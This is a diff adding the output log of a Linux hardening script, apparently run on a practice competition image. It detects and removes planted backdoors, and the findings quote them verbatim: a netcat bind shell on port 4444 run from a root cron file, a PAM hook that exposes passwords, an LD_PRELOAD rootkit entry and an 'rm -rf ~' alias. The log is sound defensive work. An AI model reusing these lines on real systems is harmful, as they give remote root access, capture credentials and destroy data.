@@ -1,0 +1,92 @@
+Starting system hardening...
+  [!] README critical services unknown - firewall rules will only be what you type
+
+=== SYS10 /etc/ld.so.preload ===
+  [!] /etc/ld.so.preload is set (LD_PRELOAD rootkit?):
+        /usr/src/evil_rabbit.so
+  [+] Emptied /etc/ld.so.preload
+  [+] Deleted /usr/src/evil_rabbit.so (backup in /root/cp-backups/20261111_031812)
+
+=== Firewall (UFW) ===
+  [*] No critical service needs an open port (per readme.conf)
+  [+] UFW enabled: deny incoming, allow outgoing, logging high
+        Status: active
+  [*] firewall done (1s)
+
+=== LightDM (guest / autologin) ===
+  [+] Removed guest/autologin/TCP settings from drop-in /etc/lightdm/lightdm.conf.d/80-autologin.conf
+  [+] LightDM: no guest, no autologin, users hidden, manual login, no X over TCP
+
+=== UMASK, login.defs ===
+  [+] login.defs: UMASK 027, SHA512, LOGIN_RETRIES 3, PASS_MAX/MIN/WARN 30/7/14
+  [+] /etc/profile: umask 027
+
+=== Kernel parameters (sysctl) ===
+  [!] /etc/sysctl.d/99-zz-net.conf overrides net.ipv4.ip_forward = 1 - removing it there
+  [*] Removed 'net.ipv4.ip_forward' from /etc/sysctl.d/99-zz-net.conf
+  [+] 44 parameters set in place in /etc/sysctl.conf
+  [+] IPv6 disabled
+  [+] Applied (sysctl --system: same order as at boot)
+
+=== SYS3 PAM backdoors ===
+  [!] common-auth has no 'auth requisite pam_deny.so' - failed passwords may be accepted:
+        auth sufficient pam_exec.so expose_authtok quiet /lib/x86_64-linux-gnu/security/pam-bd
+        auth	[success=1 default=ignore]	pam_unix.so nullok
+        auth	requisite			pam_permit.so
+        auth	required			pam_permit.so
+  [+] pam_deny restored
+        /etc/pam.d/common-auth:1:auth sufficient pam_exec.so expose_authtok quiet /lib/x86_64-linux-gnu/security/pam-bd
+  [+] Removed pam_exec from /etc/pam.d/common-auth
+
+=== SYS4 sudo.conf / sudoers defaults ===
+  [+] sudo.conf: Set disable_coredump true;Set probe_interfaces false;Set developer_mode false;
+  [+] Removed insecure Defaults (!env_reset / env_keep PATH) from /etc/sudoers
+  [+] sudoers valid (use_pty, logfile=/var/log/sudo.log)
+  [+] limits.conf: * hard core 0, * hard nproc 2500
+
+=== SYS9 permissions, root, system accounts ===
+  [+] /etc/shadow + gshadow 640 root:shadow, /etc/passwd + group 644 root:root
+  [+] root locked
+  [+] /home -> 755 root:root
+  [+] /swapfile -> 600
+  [!] Groups with a group password in /etc/gshadow: root 
+  [+] Group passwords removed
+  [!] System accounts with a login shell: syslog(/bin/bash) sysbackup(/bin/bash) toor(/bin/bash) 
+  [+] syslog -> nologin
+  [+] sysbackup -> nologin
+  [+] toor -> nologin
+  [!] System accounts with a password hash: bin sysbackup toor
+  [+] bin password removed
+  [+] sysbackup password removed
+  [+] toor password removed
+  [!] SUID/SGID on: /usr/bin/cp(-rwsr-xr-x) 
+  [+] Fixed /usr/bin/cp
+  [!] Extended ACLs on system files:
+        /usr/bin/sudo: user:bob:rwx  
+  [+] ACLs removed from system files
+
+=== SYS10 persistence spots ===
+        /etc/bash.bashrc:72:alias GOODBYE='rm -rf ~'
+  [+] Removed aliases from /etc/bash.bashrc
+  [TODO] Review /etc/hosts entries (hijack?): 172.17.0.2 mint-cptest;
+  [*] apt holds: john (fileandpackage.sh unholds what it removes and lists the rest as TODO)
+  [!] Cron file not from any package (or modified): /etc/cron.d/0hourly-sync
+          * * * * * root /bin/nc.traditional -l -p 4444 -e /bin/bash >/dev/null 2>&1
+  [+] Deleted /etc/cron.d/0hourly-sync (backup in /root/cp-backups/20261111_031812)
+  [*] APT sources: linuxmint - sources.list left alone (the Debian rewrite is for Debian images only)
+
+=== Packages + automatic updates ===
+  [*] apt-get install libpam-pwquality auditd - waits for any background apt job (log: /root/cp-state/apt-systemconfig.log)
+  [+] apt done (4s): libpam-pwquality auditd installed
+  [+] Automatic updates: daily package list update + unattended-upgrade (20auto-upgrades)
+  [+] Mint automatic updates enabled
+  [+] Update Manager: refresh the list of updates automatically (for cpuser)
+  [+] common-password: pam_unix remember=5 minlen=12; pam_pwquality retry=3 minlen=12 dictcheck/usercheck/credits
+  [+] pwquality.conf: minlen 12, 1 upper/lower/digit/other, dictcheck, usercheck
+  [+] apparmor enabled and running
+  [!] could not enable auditd
+  [+] ufw enabled and running
+  [+] unattended-upgrades enabled and running
+
+  [+] System hardening complete in 10s. Backups: /root/cp-backups/20261111_031812/
+[exit 0]
